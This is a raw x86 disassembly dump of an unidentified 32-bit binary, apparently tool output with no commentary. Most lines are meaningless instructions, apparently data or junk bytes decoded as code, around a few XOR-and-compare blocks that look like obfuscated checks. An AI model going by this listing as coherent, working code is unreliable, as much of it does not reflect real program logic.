  418cbd:	popf   
  418cbe:	mov    ss,ebp
  418cc0:	adc    DWORD PTR [edx-0x8],edx
  418cc3:	jnp    0x418c56
  418cc5:	adc    BYTE PTR [ebx+0x6],bh
  418cc8:	cmc    
  418cc9:	inc    esp
  418cca:	jno    0x418c8b
  418ccc:	push   ds
  418ccd:	and    esi,DWORD PTR [edx-0x76]
  418cd0:	icebp  
  418cd1:	cli    
  418cd2:	xchg   edi,eax
  418cd3:	(bad)  
  418cd4:	pop    ebp
  418cd5:	repz (bad) 
  418cd7:	push   ebp
  418cd8:	lds    esi,FWORD PTR [ebx]
  418cda:	push   ds
  418cdb:	xchg   ecx,eax
  418cdc:	sub    DWORD PTR [esi-0x53],esp
  418cdf:	cmp    ecx,DWORD PTR [edi+0x73]
  418ce2:	jo     0x418d0a
  418ce4:	fs aas 
  418ce6:	cld    
  418ce7:	jge    0x418d24
  418ce9:	into   
  418cea:	cwde   
  418ceb:	pop    ds
  418cec:	xchg   BYTE PTR [esp+edx*1-0x4e23b322],dl
  418cf3:	dec    esp
  418cf4:	ficomp DWORD PTR [ebp+0x6703edde]
  418cfa:	push   ebx
  418cfb:	frstor [edi]
  418cfd:	idiv   BYTE PTR [edx]
  418cff:	outs   dx,DWORD PTR ds:[esi]
  418d00:	imul   esp
  418d02:	int3   
  418d03:	adc    BYTE PTR [edi+0x2cf4a8bc],bl
  418d09:	arpl   WORD PTR [esi],di
  418d0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d0c:	mov    ebp,0x24414df7
  418d11:	mov    edx,0xff1ac3e7
  418d16:	hlt    
  418d17:	pusha  
  418d18:	pop    eax
  418d19:	pop    esi
  418d1a:	stc    
  418d1b:	mov    esi,0x109de7cb
  418d20:	inc    eax
  418d21:	jnp    0x418da2
  418d23:	pop    ss
  418d24:	mov    ebp,DWORD PTR [edx+0x4cbbf285]
  418d2a:	dec    ecx
  418d2b:	dec    edi
  418d2c:	mov    ecx,0x5dc804ea
  418d31:	xchg   ecx,eax
  418d32:	xchg   ebp,eax
  418d33:	fimul  WORD PTR [edi+0x331084e8]
  418d39:	sub    eax,esi
  418d3b:	mov    al,ds:0xffc80351
  418d40:	push   ecx
  418d41:	(bad)  
  418d42:	push   edx
  418d44:	inc    ecx
  418d45:	repnz stc 
  418d47:	iret   
  418d48:	pop    ss
  418d49:	and    al,0x28
  418d4b:	add    al,0x95
  418d4d:	and    eax,0x51458f52
  418d52:	add    eax,0x7b4fc158
  418d57:	mov    edx,0xec9e895c
  418d5c:	jnp    0x418d53
  418d5e:	(bad)  
  418d5f:	outs   dx,DWORD PTR ds:[esi]
  418d60:	jns    0x418ce4
  418d62:	push   esi
  418d63:	jecxz  0x418d37
  418d65:	loopne 0x418cfd
  418d67:	sub    al,0xd6
  418d69:	(bad)  
  418d6a:	fnstcw WORD PTR [ebp+0x2b]
  418d6d:	ins    BYTE PTR es:[edi],dx
  418d6e:	mov    cl,0x7a
  418d70:	cmp    bh,0x8f
  418d73:	cmp    al,0x53
  418d75:	push   ecx
  418d76:	push   edx
  418d77:	push   eax
  418d78:	call   0x422286
  418d7d:	mov    ecx,DWORD PTR [esp+0x50]
  418d81:	mov    ebx,DWORD PTR [esp+0x54]
  418d85:	add    eax,ecx
  418d87:	mov    ecx,DWORD PTR [esp+0x88]
  418d8e:	adc    edx,ebx
  418d90:	jmp    0x418fed
  418d95:	jmp    0x6c98:0xba87068d
  418d9c:	mov    bl,0x37
  418d9e:	cmc    
  418d9f:	mov    esp,0x41d91a4
  418da4:	fld    QWORD PTR [ebx+edi*8-0x40]
  418da8:	mov    esi,0xbebec235
  418dad:	(bad)  
  418dae:	jns    0x418d81
  418db0:	mov    ecx,?
  418db2:	fs repnz cmp eax,0x280134d0
  418db9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418dba:	mov    ds:0xec87c41b,eax
  418dbf:	jmp    0x683265ab
  418dc4:	push   ss
  418dc5:	pop    ds
  418dc6:	(bad)  
  418dc7:	std    
  418dc8:	xchg   ebx,eax
  418dc9:	jp     0x418d8e
  418dcb:	popa   
  418dcc:	xchg   esi,eax
  418dcd:	mov    ebp,0x41547ef9
  418dd2:	mov    ecx,0x3b61ec28
  418dd7:	mov    ah,0x74
  418dd9:	mov    edi,0xf5588839
  418dde:	and    al,0x8a
  418de0:	popf   
  418de1:	imul   esi,DWORD PTR [eax],0x3a4dae4c
  418de7:	mov    eax,ds:0x95eeca5a
  418dec:	cmp    eax,0xf0a1ba75
  418df1:	(bad)  
  418df3:	int3   
  418df4:	call   0x1e5bb2e3
  418df9:	in     al,dx
  418dfa:	push   ss
  418dfb:	loope  0x418d8e
  418dfd:	xor    DWORD PTR [esi-0x4674dd1f],esp
  418e03:	dec    BYTE PTR [ecx]
  418e05:	fcmovb st,st(3)
  418e07:	pop    ss
  418e08:	mov    cl,0x68
  418e0a:	add    eax,0x61eead0e
  418e0f:	or     ecx,esi
  418e11:	mov    DWORD PTR [ecx],0xdf83851
  418e17:	fistp  DWORD PTR [bx+0x49]
  418e1b:	cwde   
  418e1c:	push   cs
  418e1d:	pushf  
  418e1e:	inc    edi
  418e1f:	stc    
  418e20:	jle    0x418e5e
  418e22:	fisubr WORD PTR [edx-0x11]
  418e25:	pop    ebx
  418e26:	sbb    eax,0xe349dcfb
  418e2b:	lods   al,BYTE PTR ds:[esi]
  418e2c:	dec    edi
  418e2d:	pop    esi
  418e2e:	stc    
  418e2f:	je     0x418e9a
  418e31:	cmp    eax,0xfffcd155
  418e36:	outs   dx,DWORD PTR ds:[esi]
  418e37:	jns    0x418e01
  418e39:	test   DWORD PTR [edx+0x66],edx
  418e3c:	inc    ebx
  418e3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e3e:	pop    es
  418e3f:	stc    
  418e40:	or     al,0xe9
  418e42:	push   edx
  418e43:	add    eax,0xe6cb6186
  418e48:	inc    ebp
  418e49:	je     0x418ec8
  418e4b:	fs ins DWORD PTR es:[edi],dx
  418e4d:	lahf   
  418e4e:	mov    esi,0x91a1174f
  418e53:	call   0x5ffc6e0c
  418e58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e59:	push   0x31
  418e5b:	inc    ebx
  418e5c:	pop    es
  418e5d:	mov    cl,0xf6
  418e5f:	retf   
  418e60:	mov    eax,ds:0xc218e964
  418e65:	sbb    DWORD PTR [edi+0x79],0x9cb6667e
  418e6c:	aam    0x5c
  418e6e:	imul   edx,ebx,0xf80484d2
  418e74:	mov    al,ds:0xe43b50d5
  418e79:	das    
  418e7a:	mov    ch,0xad
  418e7c:	xor    ebx,DWORD PTR [edi]
  418e7e:	inc    eax
  418e7f:	imul   edx,DWORD PTR [edi],0x5ebce97
  418e85:	jne    0x418edf
  418e87:	adc    DWORD PTR [edx+0x12],eax
  418e8a:	sbb    eax,0x263993dc
  418e8f:	dec    edi
  418e90:	mov    ah,0xd2
  418e92:	scas   eax,DWORD PTR es:[edi]
  418e93:	add    DWORD PTR [ebp-0x11c6703b],edx
  418e99:	mov    ebp,0x2ec4885a
  418e9e:	div    DWORD PTR [ebx]
  418ea0:	pop    edi
  418ea1:	mov    ds:0x5b3d53b7,al
  418ea6:	int3   
  418ea7:	adc    ebp,esp
  418ea9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418eaa:	xor    eax,0x96c2de46
  418eaf:	jo     0x418eca
  418eb1:	sbb    BYTE PTR [esi-0x67],bl
  418eb4:	les    ebx,FWORD PTR [ebp-0x57aa33f4]
  418eba:	pop    ebx
  418ebb:	into   
  418ebc:	nop
  418ebd:	mov    ecx,0xb3b771d9
  418ec2:	sub    BYTE PTR [edx-0x28],bl
  418ec5:	mov    edi,0x9b68b764
  418eca:	leave  
  418ecb:	jne    0x418ea6
  418ecd:	mov    al,ds:0xec640cb3
  418ed2:	cli    
  418ed3:	push   edi
  418ed4:	scas   eax,DWORD PTR es:[edi]
  418ed5:	sub    BYTE PTR [esi+0x15],ch
  418ed8:	cwde   
  418ed9:	iret   
  418eda:	and    BYTE PTR [ebx],al
  418edc:	ins    BYTE PTR es:[edi],dx
  418edd:	xor    al,0x68
  418edf:	xchg   ebp,eax
  418ee0:	(bad)  
  418ee1:	std    
  418ee2:	pushf  
  418ee3:	push   edx
  418ee4:	lahf   
  418ee5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ee6:	fisubr WORD PTR [eax+0x2c]
  418ee9:	cmp    bl,BYTE PTR [edi+eiz*2]
  418eec:	or     esp,esi
  418eee:	es dec edi
  418ef0:	aaa    
  418ef1:	inc    BYTE PTR [edi-0x54]
  418ef4:	fistp  DWORD PTR [edx]
  418ef6:	retf   0x1397
  418ef9:	mov    ?,WORD PTR [ebx]
  418efb:	bound  edx,QWORD PTR [ebx]
  418efd:	mov    ebx,0xde7e96a6
  418f02:	and    DWORD PTR [esi-0x1b9d3dc],eax
  418f08:	pop    ecx
  418f09:	inc    esp
  418f0a:	push   edi
  418f0b:	fwait
  418f0c:	inc    esi
  418f0d:	jo     0x418f41
  418f0f:	outs   dx,DWORD PTR ds:[esi]
  418f10:	rcr    dl,cl
  418f12:	fistp  WORD PTR [edi-0x46]
  418f15:	aas    
  418f16:	sar    DWORD PTR ds:0x2e598b76,cl
  418f1c:	adc    BYTE PTR [ecx+0x14f8215f],al
  418f22:	(bad)  
  418f23:	ja     0x418f97
  418f25:	fwait
  418f26:	ins    DWORD PTR es:[edi],dx
  418f27:	std    
  418f28:	push   ecx
  418f29:	clc    
  418f2a:	sbb    eax,0xbcd93f8d
  418f2f:	adc    BYTE PTR [ebx],al
  418f31:	push   esi
  418f32:	pop    esi
  418f33:	js     0x418ecd
  418f35:	les    esi,FWORD PTR [esi]
  418f37:	adc    DWORD PTR [ecx],eax
  418f39:	mov    dl,0x2c
  418f3b:	les    ecx,FWORD PTR [esi-0x4aa222ed]
  418f41:	shr    ah,cl
  418f43:	xchg   esp,eax
  418f44:	jnp    0x418ec9
  418f46:	sub    esi,DWORD PTR [ecx+eax*1]
  418f49:	add    al,0x5d
  418f4b:	xor    al,0xdd
  418f4d:	fistp  WORD PTR [ebx+ecx*2-0x8]
  418f51:	popf   
  418f52:	jmp    0x418fb8
  418f54:	pop    ecx
  418f55:	push   ecx
  418f56:	icebp  
  418f57:	sbb    ecx,DWORD PTR [ebp-0x37]
  418f5a:	mov    esi,eax
  418f5c:	sar    BYTE PTR [esp+ebx*1-0x37],0x76
  418f61:	sbb    BYTE PTR ss:[esi-0x4727bdd0],al
  418f68:	push   eax
  418f69:	ret    
  418f6a:	js     0x418ef8
  418f6c:	xchg   esp,eax
  418f6d:	mov    dh,0xa7
  418f6f:	xor    esi,DWORD PTR [edx+esi*4+0x55464d4b]
  418f76:	or     al,0x52
  418f78:	push   esi
  418f79:	fisttp QWORD PTR [eax+eax*4+0x75df7c1b]
  418f80:	enter  0x43b4,0x50
  418f84:	js     0x418fa0
  418f86:	out    0xc1,al
  418f88:	xchg   ebp,eax
  418f89:	aas    
  418f8a:	fnstenv [edi+0x7f5b7386]
  418f90:	cs adc eax,0xf2039292
  418f96:	push   cs
  418f97:	xlat   BYTE PTR ds:[ebx]
  418f98:	pop    ds
  418f99:	or     eax,0xc328d0ca
  418f9e:	mov    bl,0x87
  418fa0:	or     ecx,0xabcdc57a
  418fa6:	or     al,BYTE PTR [edi]
  418fa8:	mov    edi,esi
  418faa:	(bad)  
  418fab:	adc    BYTE PTR [ecx-0x5e],dh
  418fae:	inc    ecx
  418faf:	push   cs
  418fb0:	out    dx,al
  418fb1:	lods   eax,DWORD PTR ds:[esi]
  418fb2:	cmp    DWORD PTR [edi-0x51],edi
  418fb5:	aaa    
  418fb6:	iret   
  418fb7:	mov    ch,0x1
  418fb9:	sub    eax,0xc2c1742
  418fbe:	xchg   ebx,eax
  418fbf:	cmp    al,0x2
  418fc1:	push   0xffffff83
  418fc3:	fidiv  DWORD PTR [edx]
  418fc5:	xor    DWORD PTR [edx-0x6e],ebx
  418fc8:	sub    al,0x9b
  418fca:	fimul  WORD PTR [edx+0x42789a3f]
  418fd0:	push   es
  418fd1:	ds push edx
  418fd3:	iret   
  418fd4:	lds    ebx,FWORD PTR [esi]
  418fd6:	hlt    
  418fd7:	je     0x419058
  418fd9:	icebp  
  418fda:	test   eax,0xab981830
  418fdf:	inc    ebp
  418fe1:	inc    ecx
  418fe2:	div    DWORD PTR [ecx+0x72020584]
  418fe8:	pop    edx
  418fe9:	scas   eax,DWORD PTR es:[edi]
  418fea:	mov    BYTE PTR [ebp+0x45],bl
  418fed:	mov    ebx,DWORD PTR [esp+0x8c]
  418ff4:	cmp    ecx,eax
  418ff6:	jne    0x419004
  418ffc:	cmp    ebx,edx
  418ffe:	je     0x41a937
  419004:	mov    eax,DWORD PTR [esp+0x40]
  419008:	mov    edx,DWORD PTR [esp+0x18]
  41900c:	xor    ecx,ecx
  41900e:	shld   ecx,eax,0x2
  419012:	jmp    0x41926f
  419017:	retf   0xad14
  41901a:	repnz mov eax,0x983c8a74
  419020:	xchg   edx,eax
  419021:	xor    bl,ch
  419023:	mov    al,ds:0xbc9092e5
  419028:	inc    eax
  41902a:	mov    esi,0xbebec235
  41902f:	(bad)  
  419030:	push   esi
  419031:	push   ss
  419032:	ret    0x1a6a
  419035:	jmp    0x41901f
  419037:	adc    eax,esi
  419039:	jns    0x4190b4
  41903b:	mov    al,0x64
  41903d:	ret    0x4edf
  419040:	mov    ds:0x15d7bcd0,eax
  419045:	pop    esi
  419046:	test   al,0x56
  419048:	stos   DWORD PTR es:[edi],eax
  419049:	adc    DWORD PTR [eax],ecx
  41904b:	pop    eax
  41904c:	cmp    DWORD PTR [ebx],edx
  41904e:	or     esi,ecx
  419050:	push   ecx
  419051:	(bad)  
  419052:	adc    ch,ch
  419054:	data16 loop 0x419044
  419057:	cld    
  419058:	(bad)  
  419059:	sti    
  41905a:	je     0x419019
  41905c:	mov    edi,0x1b44de2a
  419061:	and    DWORD PTR [esi-0x77],eax
  419064:	dec    esi
  419065:	mov    edi,0xf6331b1d
  41906a:	or     ebp,DWORD PTR [ebx-0x53]
  41906d:	xchg   ebx,eax
  41906e:	or     ecx,DWORD PTR [edi+0x24]
  419071:	mov    eax,0xc7229fa0
  419076:	pop    esp
  419077:	ret    
  419078:	pushf  
  419079:	out    0x32,eax
  41907b:	mov    bl,0x45
  41907d:	sbb    BYTE PTR ds:0x4175e6b1,cl
  419083:	fiadd  WORD PTR [eax-0x5bbc82a1]
  419089:	(bad)  
  41908a:	pop    ebx
  41908b:	jnp    0x41904a
  41908d:	mov    ds:0x30c513f6,al
  419092:	xchg   DWORD PTR [ecx+ebp*4-0x23d08a83],edi
  419099:	into   
  41909a:	mov    al,ds:0x932010fa
  41909f:	inc    esi
  4190a0:	cmc    
  4190a1:	cmp    al,0xd
  4190a3:	mov    ds:0x4a7efd12,eax
  4190a8:	pop    ecx
  4190a9:	repnz xor bp,bx
  4190ad:	jmp    0x88c6f292
  4190b2:	xor    BYTE PTR [edx+0x52],0x54
  4190b6:	mov    ds:0xf8b1438c,al
  4190bb:	in     eax,0xa4
  4190bd:	inc    esp
  4190be:	js     0x419045
  4190c0:	inc    esi
  4190c1:	mov    edx,0x4b0e0ec8
  4190c6:	outs   dx,BYTE PTR ds:[esi]
  4190c7:	xlat   BYTE PTR ds:[ebx]
  4190c8:	jne    0x4190e2
  4190ca:	inc    eax
  4190cb:	xor    DWORD PTR [esi],ecx
  4190cd:	xor    ch,BYTE PTR [edx-0xf]
  4190d0:	ret    0xa1fb
  4190d3:	ret    
  4190d4:	mov    dl,BYTE PTR [eax-0x1b]
  4190d7:	ja     0x419125
  4190d9:	xor    al,0x91
  4190db:	enter  0x2984,0x7b
  4190df:	mov    edx,0x40f72746
  4190e4:	inc    edx
  4190e5:	xor    edi,edx
  4190e7:	shr    al,0xa2
  4190ea:	or     ebx,edi
  4190ec:	pushf  
  4190ed:	xchg   ah,bl
  4190ef:	xchg   ebx,eax
  4190f0:	xchg   esp,eax
  4190f1:	and    edx,edi
  4190f3:	mov    ebp,0x54266013
  4190f8:	int3   
  4190f9:	popaw  
  4190fb:	aas    
  4190fc:	adc    BYTE PTR [edi],dh
  4190fe:	push   ecx
  4190ff:	fiadd  WORD PTR [ebx-0x22]
  419102:	xor    eax,0xc4519f81
  419107:	imul   BYTE PTR [ebx]
  419109:	retf   0xe7b3
  41910c:	in     eax,dx
  41910d:	aad    0x78
  41910f:	pop    esp
  419110:	push   0x9b135f78
  419115:	in     eax,0x9
  419117:	nop
  419118:	aad    0x48
  41911a:	(bad)
  41911d:	sbb    dh,0x9d
  419120:	aad    0xe7
  419122:	jg     0x419167
  419124:	lods   al,BYTE PTR ds:[esi]
  419125:	pop    ss
  419126:	sti    
  419127:	sub    DWORD PTR gs:[ebp+0x7adceb51],ecx
  41912e:	mov    ecx,DWORD PTR [ebx-0x28]
  419131:	into   
  419132:	test   al,0x2b
  419134:	or     eax,ecx
  419136:	jmp    0x419159
  419138:	inc    esi
  419139:	mov    al,0xad
  41913b:	push   0x4e
  41913d:	jne    0x419140
  41913f:	mov    dl,0x4f
  419141:	(bad)  
  419143:	nop
  419144:	and    ecx,DWORD PTR [edi-0x40e21995]
  41914a:	rcl    DWORD PTR [ecx],0x50
  41914d:	aas    
  41914e:	sahf   
  41914f:	(bad)  
  419150:	mov    ch,0x3c
  419152:	out    dx,al
  419153:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419154:	retf   0xd1ff
  419157:	sbb    bh,al
  419159:	sub    ecx,eax
  41915b:	clc    
  41915c:	inc    ebp
  41915d:	jp     0x41916b
  41915f:	shr    BYTE PTR [edx-0x48f10ac3],1
  419165:	jecxz  0x419196
  419167:	or     esi,ebx
  419169:	(bad)  
  41916a:	pop    ss
  41916b:	div    DWORD PTR [edi+0x43]
  41916e:	je     0x41914b
  419170:	sub    al,0xb7
  419172:	adc    ebx,DWORD PTR [esi+edi*4]
  419175:	and    bh,BYTE PTR [eax-0x56]
  419178:	das    
  419179:	lea    esp,[ebx-0x2ec198c]
  41917f:	or     bh,dh
  419181:	inc    edi
  419182:	mov    ds:0x257241b3,eax
  419187:	sub    bl,BYTE PTR ds:0x2df5ccb
  41918d:	jns    0x419198
  41918f:	and    esi,DWORD PTR ss:[eax-0x6]
  419193:	fwait
  419194:	mov    edi,0x25892846
  419199:	mov    eax,ds:0x9dea0116
  41919e:	repz call 0xe431:0x3932dc7e
  4191a6:	jno    0x419157
  4191a8:	out    dx,eax
  4191a9:	jae    0x419142
  4191ab:	scas   eax,DWORD PTR es:[edi]
  4191ac:	mov    ds:0xf8aa24d0,al
  4191b1:	fbstp  TBYTE PTR [esi-0x1a]
  4191b4:	cmp    DWORD PTR [edi],ebp
  4191b6:	add    BYTE PTR [edi],bl
  4191b8:	pop    edi
  4191b9:	add    al,0x52
  4191bb:	call   0xc131cd79
  4191c0:	sbb    DWORD PTR [eax-0x56f6a452],ebx
  4191c6:	jecxz  0x4191e2
  4191c8:	xor    bl,dh
  4191ca:	pop    esi
  4191cb:	fwait
  4191cc:	fs sbb eax,0xf5d2a32a
  4191d2:	ret    0xc9ba
  4191d5:	gs ds inc edx
  4191d8:	cmp    ah,BYTE PTR [esi+0x4e]
  4191db:	fist   WORD PTR [ebx+ecx*1-0x4f948d82]
  4191e2:	out    dx,eax
  4191e3:	imul   ecx,ebp,0xffffffe3
  4191e6:	std    
  4191e7:	sub    DWORD PTR [ebx],esp
  4191e9:	neg    DWORD PTR [ebx*2+0x7bf5cbbf]
  4191f0:	sub    dl,0xcf
  4191f3:	push   ecx
  4191f4:	stos   DWORD PTR es:[edi],eax
  4191f5:	std    
  4191f6:	jmp    0x6bc3:0xc948b32e
  4191fd:	cmp    al,0x59
  4191ff:	cld    
  419200:	fst    DWORD PTR [eax]
  419202:	pop    ss
  419203:	push   edx
  419204:	daa    
  419205:	pop    es
  419206:	cmp    al,dh
  419208:	and    ch,BYTE PTR [eax+0x18a1c85e]
  41920e:	adc    DWORD PTR [eax],ebp
  419210:	stos   DWORD PTR es:[edi],eax
  419211:	bound  esi,QWORD PTR [ebx]
  419213:	dec    esp
  419214:	pop    ebp
  419215:	sbb    cl,ah
  419217:	popa   
  419218:	add    edi,esp
  41921a:	push   ecx
  41921b:	pop    ebp
  41921c:	push   ds
  41921d:	jl     0x4191d7
  41921f:	out    0xee,al
  419221:	aas    
  419222:	jo     0x419298
  419224:	pop    ecx
  419225:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419226:	test   ebp,ebp
  419228:	mov    cl,0x16
  41922a:	mov    dl,0x63
  41922c:	xor    edx,edi
  41922e:	in     al,dx
  41922f:	or     BYTE PTR [eax],al
  419231:	repz adc esi,0xf9d40f9d
  419238:	in     al,dx
  419239:	and    al,0xca
  41923b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41923c:	lea    ecx,[ebx-0xccf102f]
  419242:	dec    esp
  419243:	and    eax,0x5f037b11
  419248:	aas    
  419249:	mov    fs,ebp
  41924b:	lock xlat BYTE PTR ds:[ebx]
  41924d:	cld    
  41924e:	xor    edi,ecx
  419250:	cmp    BYTE PTR [esi+0xa],0xd3
  419254:	out    0xa4,al
  419256:	aaa    
  419257:	jb     0x41920f
  419259:	mov    ss,WORD PTR [ebp+0x6c]
  41925c:	scas   eax,DWORD PTR es:[edi]
  41925d:	mov    edx,0xa3761e64
  419262:	push   edi
  419263:	jp     0x41923c
  419265:	daa    
  419266:	dec    ecx
  419267:	pop    ecx
  419268:	rol    BYTE PTR ds:[edi],cl
  41926b:	pop    ebx
  41926c:	loopne 0x419273
  41926e:	test   ecx,eax
  419270:	loopne 0x419274
  419272:	mov    ebx,0xcb79b576
  419277:	mov    DWORD PTR [esp+0x10],edx
  41927b:	mov    edx,DWORD PTR [esp+0x1c]
  41927f:	xor    eax,ebx
  419281:	xor    ecx,esi
  419283:	mov    DWORD PTR [esp+0x14],edx
  419287:	cmp    eax,DWORD PTR [esp+0x10]
  41928b:	jne    0x419299
  419291:	cmp    ecx,edx
  419293:	je     0x41a93c
  419299:	mov    eax,DWORD PTR [esp+0x44]
  41929d:	cmp    eax,0xa5069baa
  4192a2:	je     0x4192f6
  4192a8:	mov    edx,DWORD PTR [esp+0x18]
  4192ac:	mov    eax,DWORD PTR [esp+0x1c]
  4192b0:	xor    eax,esi
  4192b2:	xor    edx,0xcb79b577
  4192b8:	shrd   edx,eax,0x2
  4192bc:	shr    eax,0x2
  4192bf:	mov    DWORD PTR [esp+0x34],eax
  4192c3:	mov    eax,DWORD PTR [esp+0x18]
  4192c7:	mov    ecx,DWORD PTR [esp+0x1c]
  4192cb:	shl    eax,0x1e
  4192ce:	xor    eax,0x80000000
  4192d3:	or     eax,DWORD PTR [esp+0x34]
  4192d7:	xor    ecx,ecx
  4192d9:	mov    DWORD PTR [esp+0x14],eax
  4192dd:	mov    eax,DWORD PTR [esp+0x60]
  4192e1:	or     ecx,edx
  4192e3:	cdq    
  4192e4:	cmp    ecx,eax
  4192e6:	jne    0x41a93c
  4192ec:	cmp    DWORD PTR [esp+0x14],edx
  4192f0:	jne    0x41a93c
  4192f6:	mov    DWORD PTR [esp+0x5c],0x4227a4
  4192fe:	mov    DWORD PTR [esp+0x68],0x42279c
  419306:	mov    eax,DWORD PTR [esp+0x78]
  41930a:	mov    eax,DWORD PTR [esp+0x78]
  41930e:	mov    edx,DWORD PTR [esp+0x18]
  419312:	xor    ecx,ecx
  419314:	shld   ecx,eax,0x2
  419318:	shl    eax,0x2
  41931b:	mov    DWORD PTR [esp+0x10],edx
  41931f:	mov    edx,DWORD PTR [esp+0x1c]
  419323:	xor    eax,ebx
  419325:	xor    ecx,esi
  419327:	mov    DWORD PTR [esp+0x14],edx
  41932b:	cmp    DWORD PTR [esp+0x10],eax
  41932f:	jne    0x41a5e3
  419335:	cmp    edx,ecx
  419337:	jne    0x41a5e3
  41933d:	mov    DWORD PTR [esp+0x30],0x42272c
  419345:	mov    eax,DWORD PTR [esp+0x18]
  419349:	mov    ecx,DWORD PTR [esp+0x1c]
  41934d:	shrd   eax,ecx,0x2
  419351:	shr    ecx,0x2
  419354:	mov    ecx,DWORD PTR [esp+0x18]
  419358:	mov    edx,DWORD PTR [esp+0x1c]
  41935c:	mov    edx,DWORD PTR [esp+0x30]
  419360:	mov    edx,DWORD PTR [edx+0xc]
  419363:	mov    DWORD PTR [esp+0xc],eax
  419367:	shl    ecx,0x1e
  41936a:	mov    eax,0x32de6d5d
  41936f:	xor    DWORD PTR [esp+0xc],eax
  419373:	xor    ecx,ecx
  419375:	or     ecx,DWORD PTR [esp+0xc]
  419379:	cmp    ecx,DWORD PTR [edx]
  41937b:	jne    0x41a320
  419381:	mov    ecx,0x65c7
  419386:	mov    WORD PTR [esp+0x2c],cx
  41938b:	mov    ecx,0x6062
  419390:	mov    WORD PTR [esp+0x24],cx
  419395:	mov    ecx,0x125d
  41939a:	mov    WORD PTR [esp+0xc],cx
  41939f:	movzx  ecx,WORD PTR [esp+0xc]
  4193a4:	mov    edx,0x2d0f
  4193a9:	and    cx,dx
  4193ac:	mov    dx,WORD PTR [esp+0x24]
  4193b1:	or     cx,dx
  4193b4:	mov    dx,WORD PTR [esp+0x2c]
  4193b9:	add    cx,dx
  4193bc:	or     ecx,0x3b22
  4193c2:	mov    WORD PTR [esp+0x3c],cx
  4193c7:	mov    ecx,0x57d4
  4193cc:	mov    WORD PTR [esp+0x2c],cx
  4193d1:	mov    ecx,0x3b21
  4193d6:	mov    WORD PTR [esp+0x38],cx
  4193db:	mov    ecx,0x52fd
  4193e0:	mov    WORD PTR [esp+0x24],cx
  4193e5:	mov    ecx,0x2ce0
  4193ea:	mov    WORD PTR [esp+0xc],cx
  4193ef:	mov    cx,WORD PTR [esp+0xc]
  4193f4:	mov    dx,WORD PTR [esp+0x24]
  4193f9:	jmp    0x419656
  4193fe:	gs pop ss
  419400:	dec    BYTE PTR [eax+esi*4]
  419403:	sbb    al,0x6b
  419405:	mov    esp,0xd16889ea
  41940a:	fild   QWORD PTR [ebp-0x58]
  41940d:	jecxz  0x419442
  41940f:	add    eax,0xc235bec0
  419414:	mov    esi,0x64b88ebe
  419419:	xchg   edx,eax
  41941a:	cwde   
  41941b:	scas   al,BYTE PTR es:[edi]
  41941c:	rol    DWORD PTR [edi+0x3ce14c89],1
  419422:	sub    esi,DWORD PTR [eax+0x4a]
  419425:	xchg   esi,eax
  419426:	push   edx
  419427:	mov    al,ds:0xea588083
  41942c:	and    eax,0x33da3b1
  419431:	push   cs
  419432:	or     eax,0xe370d305
  419437:	mov    ds:0x932fe94,al
  41943c:	push   ebx
  41943d:	fist   DWORD PTR [ecx]
  41943f:	dec    edi
  419440:	add    eax,DWORD PTR [esi-0x75]
  419443:	mov    ds:0x76806c77,al
  419448:	jae    0x419437
  41944a:	sub    eax,DWORD PTR [edi+0x7075a3eb]
  419450:	jmp    0x4193f3
  419452:	in     eax,0xb6
  419454:	pop    esp
  419455:	jmp    0x419426
  419457:	sub    ebx,edi
  419459:	fisubr DWORD PTR [ecx+0x3e]
  41945c:	dec    ebx
  41945d:	retf   0xe5d0
  419460:	ret    
  419461:	sbb    DWORD PTR [eax+0x7012e18e],ebx
  419467:	push   edx
  419468:	test   DWORD PTR [ebx-0x7eed9839],edi
  41946e:	jns    0x419484
  419470:	fsubr  DWORD PTR [eax+eax*8]
  419473:	adc    eax,0x3c9af157
  419478:	nop
  419479:	mov    esi,0xf83e7b5
  41947e:	fimul  DWORD PTR [ecx]
  419480:	mov    dl,0xb3
  419482:	(bad)  
  419483:	push   edi
  419484:	inc    eax
  419485:	ja     0x4194dd
  419487:	aas    
  419488:	mov    ds:0x6ea1152d,eax
  41948d:	add    eax,DWORD PTR [edx-0x6e]
  419490:	push   eax
  419491:	ret    0x1fc4
  419494:	push   ebp
  419495:	sbb    al,BYTE PTR [esi]
  419497:	adc    BYTE PTR [ebx],ah
  419499:	loop   0x4194a7
  41949b:	and    al,0x5f
  41949d:	mov    ecx,0x6cb04f3d
  4194a2:	mov    dh,0xa0
  4194a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4194a5:	call   DWORD PTR [esi-0x5362dc78]
  4194ab:	mov    ebp,0x88b4bdfa
  4194b0:	jmp    0xc4d0:0xd395c44b
  4194b7:	lea    esi,[esi-0x58]
  4194ba:	retf   
  4194bb:	cmp    bl,BYTE PTR [ebx-0x35fa7945]
  4194c1:	push   0x8bdbe430
  4194c6:	cli    
  4194c7:	ror    DWORD PTR [edx-0x127a6d62],cl
  4194cd:	mov    esi,0x71e905b9
  4194d2:	mov    BYTE PTR [eax],cl
  4194d4:	push   edi
  4194d5:	push   esi
  4194d6:	call   0xb533:0x4dd787b7
  4194dd:	xor    bl,cl
  4194df:	leave  
  4194e0:	sbb    eax,0x312c3fed
  4194e5:	jno    0x4194da
  4194e7:	pop    esp
  4194e8:	push   edi
  4194e9:	cwde   
  4194ea:	sub    eax,0x6d2f1610
  4194ef:	int    0x51
  4194f1:	xor    ebp,DWORD PTR gs:[esi-0x40918de3]
  4194f8:	dec    ebx
  4194f9:	fwait
  4194fa:	mov    ds:0x8e8c29a0,al
  4194ff:	sbb    eax,DWORD PTR [ebx+0x577f789]
  419505:	adc    dh,ah
  419507:	mov    ebx,0xb4f47d6c
  41950c:	push   es
  41950d:	das    
  41950e:	dec    edi
  41950f:	or     dl,BYTE PTR [eax+0x194dfbef]
  419515:	sub    eax,0x607b8cf6
  41951a:	(bad)  
  41951b:	je     0x419509
  41951d:	or     BYTE PTR [edx+0x16],0xe5
  419521:	aas    
  419522:	inc    BYTE PTR [ecx]
